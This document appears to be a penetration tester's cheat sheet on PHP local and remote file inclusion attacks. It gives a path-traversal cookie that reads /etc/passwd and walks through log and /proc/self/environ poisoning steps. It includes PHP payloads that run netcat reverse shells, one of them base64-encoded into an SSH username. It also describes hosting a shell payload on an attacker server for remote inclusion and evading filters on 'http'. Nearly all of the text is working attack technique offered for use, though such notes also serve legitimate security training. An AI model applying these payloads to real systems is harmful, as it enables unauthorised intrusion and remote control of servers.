Local File Inclusion

	Detection in cookies
		Request
		GET /vulnerable.php HTTP/1.1
		Cookie:usid=../../../../../../../../../../etc/passwd%00

		Response
		HTTP/1.1 200 OK 
		...
		Server: Apache root:fi3sER6:0:1:System Operator:/:/bin/ksh//

	path migration
		end path in %00 to terminate the request 
			used if code uses include($page . '.php');

	inject code to readable files (log and environment)
		e.g. /proc/self/environ
			/var/log/auth.log
			/var/log/apache2/access.log
			
		environment variable
			find file using path migration (e.g. ?page=../../../../proc/self) and find environment variable to alter (e.g. HTTP_USER_AGENT)

			use proxy to modify variable content with php (e.g. <?phpinfo();?>) to test vuln

			set up listener

			use proxy to inject
				<?passthru("nc -e /bin/sh <LHOST> <LPORT>");?>

		log
			find log file using path migration (e.g. ?page=../../../../var/log/auth.log)

			try to ssh into target server

			show log and search for attacker username

			encode this in b64:
				nc -e /bin/sh <LHOST> <LPORT>
			
			try to ssh in using:
				ssh "<?passthru(base64_decode('b64_block'));?>"@<target_ip>

			reload log file to execute code

Remote File Inclusion

	if allow_url_fopen and allow_url_include are enabled in the /etc/php5/cgi/php.ini

	create file on acessible web platform (needs routable IP) containing:
		<?passthru("nc -e /bin/sh <LHOST> <LPORT>");?>
	save as payload.txt file (so it executes on remote target not local machine) in /var/www/html

	set up listener

	replace ?page=include.php with 
	?page=http://attack_server/payload.txt

	NOTE: may need ? on end to get it to execute as PHP

	may have to circumvent filtering of "http"
		try "hTTp", ...
